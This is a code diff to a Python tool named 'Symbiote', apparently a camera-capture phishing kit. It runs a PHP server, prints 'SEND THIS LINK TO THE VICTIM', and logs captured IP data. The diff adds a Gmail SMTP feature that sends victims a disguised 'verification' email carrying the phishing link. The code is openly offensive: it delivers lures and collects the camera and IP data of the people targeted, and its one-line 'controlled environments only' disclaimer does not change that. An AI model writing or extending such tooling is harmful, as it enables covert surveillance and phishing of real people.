@@ -2,10 +2,12 @@
 # -*- coding: utf-8 -*-
 """
 Symbiote - minimal version (camera + PHP server)
-Direct flow: banner -> consent -> checks -> camera -> port -> PHP server
-             -> show link -> capture report.
+Direct flow: banner -> consent -> checks -> camera -> port -> email config
+             -> PHP server -> show link -> capture report.
 ngrok is NOT managed by the tool: run it yourself, e.g.  ngrok http 1516
 If ngrok is already running, its public URL is detected automatically.
+From the monitor prompt:  send <email>  sends the verification link
+(Gmail SMTP + Server/email_template.html). ENTER refreshes, X exits.
 For use in controlled environments only.
 """
 import os
@@ -13,6 +15,7 @@ from os import system
 from time import sleep
 from sys import exit
 from Checks import net, checkPHP
+from Mailer import askConfig, sendMail
 from logo import banner, end
 
 RED, CYAN, GREEN, DEFAULT, YELLOW = '\033[1;91m', '\033[1;36m', '\033[1;32m', '\033[0m', '\033[1;33m'
@@ -89,7 +92,7 @@ def getNgrokUrl():
     return url
 
 
-def start(port, name):
+def start(port, name, mail):
     clear()
     banner()
     print("\n[{0}*{1}] Starting PHP server on port {2}...".format(CYAN, DEFAULT, port))
@@ -105,10 +108,10 @@ def start(port, name):
             break
         sleep(1)
 
-    report(url, port, name)
+    report(url, port, name, mail)
 
 
-def report(url, port, name):
+def report(url, port, name, mail):
     clear()
     banner()
     print("\n[{0}*{1}] SEND THIS LINK TO THE VICTIM:".format(YELLOW, DEFAULT))
@@ -120,7 +123,7 @@ def report(url, port, name):
             YELLOW, DEFAULT, CYAN, port))
         print("  [{0}*{1}] If ngrok is already running, restart this tool or press ENTER to re-check.".format(
             YELLOW, DEFAULT))
-    print("\n  ENTER = refresh captures | X = exit\n")
+    print("\n  ENTER = refresh | send <email> = send link | X = exit\n")
 
     last = ''
     while True:
@@ -142,11 +145,30 @@ def report(url, port, name):
             if data != last:
                 system('cat Server/%s/ip.txt >> CapturedData/ip.txt' % name)
                 last = data
-        ans = input("\n<Symbiote> ----> ").strip().upper()
-        if ans == 'X':
+        ans = input("\n<Symbiote> ----> ").strip()
+
+        if ans.upper() == 'X':
             stop(port, name)
             end()
             exit()
+
+        if ans.lower().startswith('send'):
+            target = ans[4:].strip()
+            if not target or '@' not in target:
+                print("\n [{0}!{1}] Usage: send <email@domain>".format(RED, DEFAULT))
+            elif not mail:
+                print("\n [{0}!{1}] Email sending disabled: restart the tool and enter Gmail + app password.".format(RED, DEFAULT))
+            else:
+                dest = url if url else 'http://127.0.0.1:%s' % port
+                if not url:
+                    print(" [{0}!{1}] WARNING: no public URL detected; the email will carry the LOCAL link.".format(YELLOW, DEFAULT))
+                print("\n [{0}*{1}] Sending notification email to {2}...".format(CYAN, DEFAULT, target))
+                err = sendMail(target, dest, mail)
+                if err:
+                    print(" [{0}!{1}] Send FAILED: {2}".format(RED, DEFAULT, err))
+                else:
+                    print(" [{0}OK{1}] Email sent to {2}".format(GREEN, DEFAULT, target))
+
         # Re-check ngrok in case it was started after launching the tool
         if not url:
             url = getNgrokUrl()
@@ -159,7 +181,7 @@ def report(url, port, name):
             print("  Local URL:  {0}http://127.0.0.1:{1}{2}".format(GREEN, port, DEFAULT))
             print("\n  [{0}*{1}] Start your tunnel manually, e.g.:  {2}ngrok http {3}".format(
                 YELLOW, DEFAULT, CYAN, port))
-        print("\n  ENTER = refresh captures | X = exit\n")
+        print("\n  ENTER = refresh | send <email> = send link | X = exit\n")
 
 
 def stop(port, name):
@@ -188,4 +210,5 @@ if __name__ == '__main__':
     getpath()
     camera = chooseCamera()
     port = choosePort()
-    start(port, camera)
+    mail = askConfig()
+    start(port, camera, mail)
